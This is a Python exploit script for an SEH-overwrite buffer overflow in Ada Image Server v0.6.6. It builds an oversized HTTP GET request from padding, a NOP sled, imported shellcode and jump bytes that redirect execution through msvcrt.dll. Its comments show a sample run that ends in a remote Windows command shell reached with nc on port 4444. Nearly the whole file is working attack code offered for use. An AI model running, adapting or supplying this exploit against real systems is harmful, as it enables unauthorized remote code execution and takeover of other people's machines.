#!/usr/bin/python
# Only usable module with safeseh disabled on XP SP2 and XP SP3 is imgsrv.exe.
# However, it contains a null character in the address (ex: XP SP3 => 00689aff).
# Versions above 0.6.7 do not seem to be vulnerable.
# 
# $ ./imgsrv.py 192.168.1.146
#
# [*] Ada Image Server v0.6.6 SEH Overwrite
# [*] Discovered/Exploited by Blake
# [*] Tested on XP SP1
#
# [+] Connecting to 192.168.1.146
# [+] Sending payload
# [+] Payload Sent
#
# $ nc 192.168.1.146 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Program Files\Imgsvr>

# print "\n[*] Ada Image Server v0.6.6 SEH Overwrite"
# print "[*] Discovered/Exploited by Blake"
# print "[*] Tested on XP SP1\n"





import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):
	host = target_machine
	port = target_port	# default port

	



	payload = b"\x41" * 19000			# overwrites seh handler at 19734
	nops = b"\x90" * 29				# nop sled				
	sc = buf					# shellcode - 696 bytes
	near_jmp = b"\xe9\x44\xfd\xff\xff"		# jump back -700 bytes
	next_seh = b"\xeb\xf9\xff\xff"			# jump back -7 bytes 
	seh = b"\x10\xbf\xc1\x77"			# c:\windows\system32\msvcrt.dll
	junk = b"\x43" * 262				# junk buffer


	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host,port))
	except:
	
		pass

	
	s.send(b"GET /" + payload + nops + sc + near_jmp + next_seh + seh + junk + b" HTTP/1.0\r\n\r\n")
	s.close()
